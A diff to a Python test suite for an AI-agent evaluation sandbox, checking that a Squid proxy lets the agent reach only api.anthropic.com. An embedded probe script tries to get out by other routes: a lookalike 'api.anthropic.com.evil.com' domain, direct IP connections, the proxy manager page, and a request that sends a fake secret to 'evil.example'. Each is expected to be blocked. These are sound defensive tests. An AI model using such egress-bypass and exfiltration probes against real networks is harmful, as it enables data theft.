@@ -7,6 +7,10 @@ from __future__ import annotations
 
 import asyncio
 import json
+import os
+import shutil
+import subprocess
+import time
 from pathlib import Path
 from types import SimpleNamespace
 
@@ -227,7 +231,7 @@ def test_when_the_session_log_is_missing_then_a_warning(caplog) -> None:
 def test_session_log_follows_the_image_user_and_working_dir() -> None:
     dockerfile = task.COMPOSE.with_name("Dockerfile").read_text().splitlines()
     user = [ln.split()[1] for ln in dockerfile if ln.startswith("USER ")][-1]
-    (service,) = yaml.safe_load(task.COMPOSE.read_text())["services"].values()
+    service = yaml.safe_load(task.COMPOSE.read_text())["services"]["default"]
     slug = service["working_dir"].replace("/", "-")
     assert task.SESSION_LOG == f"/home/{user}/.claude/projects/{slug}/{{}}.jsonl"
 
@@ -275,6 +279,19 @@ async def test_run_claude_happy_path() -> None:
     assert flags["--disallowedTools"] == "WebFetch,WebSearch"
     assert not {"--bare", "--append-system-prompt", "--system-prompt"} & set(cmd)
     assert kwargs == {"timeout": 7, "timeout_retry": False}  # nothing of the host's env
+    assert "--model" not in cmd  # the subscription's default
+
+
+async def test_when_a_model_is_given_then_claude_runs_on_it() -> None:
+    sb = FakeSandbox({"claude": ok("{}")})
+    await task.run_claude(sb, "x", 7, "claude-sonnet-5-5")
+    ((cmd, _),) = sb.execs
+    assert cmd[-2:] == ["--model", "claude-sonnet-5-5"]
+
+
+def test_when_a_model_is_given_to_our_answers_then_task_build_raises() -> None:
+    with pytest.raises(ValueError, match="model is for agent=claude"):
+        task.policy_writing(agent="reference", model="claude-sonnet-5-5")
 
 
 async def test_when_claude_times_out_then_the_partial_output_is_kept() -> None:
@@ -311,14 +328,138 @@ async def test_when_the_sandbox_env_is_wrong_then_the_solver_refuses() -> None:
 
 
 def test_compose_passes_only_the_token_and_the_image_holds_none() -> None:
-    (service,) = yaml.safe_load(task.COMPOSE.read_text())["services"].values()
+    service = yaml.safe_load(task.COMPOSE.read_text())["services"]["default"]
     assert service["working_dir"] == "/workspace"
-    assert service["environment"] == ["CLAUDE_CODE_OAUTH_TOKEN", "IS_SANDBOX=1"]
+    assert service["environment"] == [
+        "CLAUDE_CODE_OAUTH_TOKEN",
+        "IS_SANDBOX=1",
+        "HTTPS_PROXY=http://proxy:3128",
+        "HTTP_PROXY=http://proxy:3128",
+        "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1",
+        "NO_PROXY=localhost,127.0.0.1",
+    ]
     dockerfile = task.COMPOSE.with_name("Dockerfile").read_text()
     assert "ANTHROPIC" not in dockerfile and "sk-ant" not in dockerfile
     assert "OAUTH_TOKEN=" not in dockerfile and "claude-code@2." in dockerfile
     users = [ln.split()[1] for ln in dockerfile.splitlines() if ln.startswith("USER ")]
     assert users[-1] not in ("root", "0")  # bypassPermissions is refused as root
+
+
+def test_sandbox_reaches_only_anthropic_through_the_proxy() -> None:
+    compose = yaml.safe_load(task.COMPOSE.read_text())
+    assert compose["services"].keys() == {"default", "proxy"}  # no other way out
+    agent, proxy = compose["services"]["default"], compose["services"]["proxy"]
+    assert agent["networks"] == ["sandbox"] and compose["networks"]["sandbox"] == {
+        "internal": True
+    }
+    assert set(proxy["networks"]) == {"sandbox", "egress"}
+    assert not compose["networks"]["egress"]  # not internal: the proxy's way out
+    assert agent.keys() <= {
+        *("build", "image", "command", "init", "stop_grace_period", "working_dir"),
+        *("environment", "networks", "depends_on"),
+    }
+    assert agent["depends_on"] == {"proxy": {"condition": "service_healthy"}}
+    assert "ports" not in proxy and proxy["healthcheck"]["retries"] == 10
+    for service in compose["services"].values():
+        assert not {"dns", "extra_hosts", "network_mode", "cap_add", "privileged"} & (
+            service.keys()
+        )
+    assert proxy["image"].endswith(
+        "@sha256:8a3baed477e2c282ab8aa5edad442f69873246964f225c5c2ae8364b6610963c"
+    )
+    conf = task.COMPOSE.with_name("squid.conf").read_text().splitlines()
+    assert proxy["volumes"] == ["./squid.conf:/etc/squid/squid.conf:ro"]
+    lines = [ln.strip() for ln in conf]
+    assert [ln for ln in lines if ln and not ln.startswith("#")] == [
+        "http_port 3128",
+        "acl anthropic dstdomain -n api.anthropic.com",  # -n: no reverse DNS on an IP
+        "acl tls port 443",
+        "acl CONNECT method CONNECT",
+        "http_access allow CONNECT anthropic tls",
+        "http_access deny all",
+        "cache deny all",
+        "logformat egress %ts.%03tu %Ss/%03>Hs %Sh %rm %>rd:%>rP",  # no URL path
+        "access_log stdio:/var/log/squid/access.log egress",  # tailed to stdout
+    ]
+
+
+PROBE = """
+import json, socket
+def ask(req):
+    try:
+        s = socket.create_connection(("proxy", 3128), timeout=8)
+        s.sendall(req.encode())
+        line = s.recv(400).decode(errors="replace").split("\\r\\n")[0]
+        s.close()
+        return line
+    except OSError as e:
+        return f"ERR {e}"
+def connect(target):
+    return ask(f"CONNECT {target} HTTP/1.1\\r\\nHost: {target}\\r\\n\\r\\n")
+def direct(host, port):
+    try:
+        socket.create_connection((host, port), timeout=4).close()
+        return "OPEN"
+    except OSError as e:
+        return f"ERR {e}"
+def dns(host):
+    try:
+        return socket.gethostbyname(host)
+    except OSError as e:
+        return f"ERR {e}"
+get = "GET http://{0}/{1} HTTP/1.1\\r\\nHost: {0}\\r\\n\\r\\n"
+print(json.dumps({
+    "api:443": connect("api.anthropic.com:443"),
+    "example:443": connect("example.com:443"),
+    "api:80": connect("api.anthropic.com:80"),
+    "suffix:443": connect("api.anthropic.com.evil.com:443"),
+    "ip:443": connect("160.79.104.10:443"),
+    "get api": ask(get.format("api.anthropic.com", "")),
+    "mgr": ask(get.format("proxy:3128", "squid-internal-mgr/info")),
+    "secret": ask(get.format("evil.example", "s3cr3t-in-path")),
+    "dns": dns("api.anthropic.com"),
+    "tcp": direct("160.79.104.10", 443),
+}))
+"""
+
+
+@pytest.mark.integration
+def test_the_running_sandbox_reaches_only_anthropic_through_the_proxy() -> None:
+    """Brings compose.yaml up (no token, no build) and probes from `default`."""
+    docker = shutil.which("docker")
+    if not docker or subprocess.run([docker, "info"], capture_output=True).returncode:
+        pytest.skip("docker is not running")
+    image = [docker, "image", "inspect", "hexgate-policy-eval"]
+    if subprocess.run(image, capture_output=True).returncode:
+        pytest.skip("no hexgate-policy-eval image: `make policy-eval` builds it")
+    compose = [docker, "compose", "-f", str(task.COMPOSE)]
+    compose += ["-p", f"hexgate-egress-test-{os.getpid()}"]
+    env = {k: v for k, v in os.environ.items() if k != "CLAUDE_CODE_OAUTH_TOKEN"}
+    try:
+        up = [*compose, "up", "-d", "--no-build", "--wait", "--wait-timeout", "60"]
+        subprocess.run(up, env=env, check=True, capture_output=True)
+        out = subprocess.run(
+            [*compose, "exec", "-T", "default", "python3", "-c", PROBE],
+            env=env,
+            check=True,
+            capture_output=True,
+            text=True,
+        ).stdout
+        for _ in range(20):  # squid writes a line when the connection closes
+            logs = subprocess.run(
+                [*compose, "logs", "proxy"], env=env, capture_output=True, text=True
+            ).stdout
+            if "evil.example" in logs:
+                break
+            time.sleep(0.5)
+    finally:
+        down = [*compose, "down", "-v", "--timeout", "1"]
+        subprocess.run(down, env=env, capture_output=True)
+    got = json.loads(out)
+    assert got.pop("api:443").startswith("HTTP/1.1 200")
+    assert got.pop("dns").startswith("ERR") and got.pop("tcp").startswith("ERR")
+    assert all(" 403 " in line for line in got.values()), got
+    assert "evil.example:80" in logs and "s3cr3t" not in logs
 
 
 def test_sandbox_image_installs_opa_per_architecture_before_dropping_root() -> None:
@@ -355,8 +496,9 @@ async def test_claude_agent_and_scorer_happy_path(ws: Path, monkeypatch) -> None
     monkeypatch.setattr(task, "sandbox", lambda: sb)
     monkeypatch.setattr(task, "sample_limits", SimpleNamespace)
     state = TaskState(ModelName("none/none"), CASE, 0, "/write-policy x", [])
-    state = await task.claude_agent(7)(state, None)
+    state = await task.claude_agent(7, "claude-sonnet-5-5")(state, None)
     assert {".claude/skills/write-policy/SKILL.md"} == set(sb.written)
+    assert sb.execs[-1][0][-2:] == ["--model", "claude-sonnet-5-5"]
     assert state.output.completion == "Capped at 50 USD."
     assert [m.role for m in state.messages] == [
         "user",
@@ -364,9 +506,10 @@ async def test_claude_agent_and_scorer_happy_path(ws: Path, monkeypatch) -> None
         "tool",
         "assistant",
     ]
-    score = await task.policy_checks()(state, Target(""))
+    score = await task.policy_checks("claude-sonnet-5-5")(state, Target(""))
     assert score.value == CORRECT
     assert score.metadata["usage"] == {k: RESULT[k] for k in task.USAGE_KEYS}
+    assert score.metadata["model"] == "claude-sonnet-5-5"
 
 
 # `grade` is the step after the pull: a workspace on the host, as the sandbox left it.
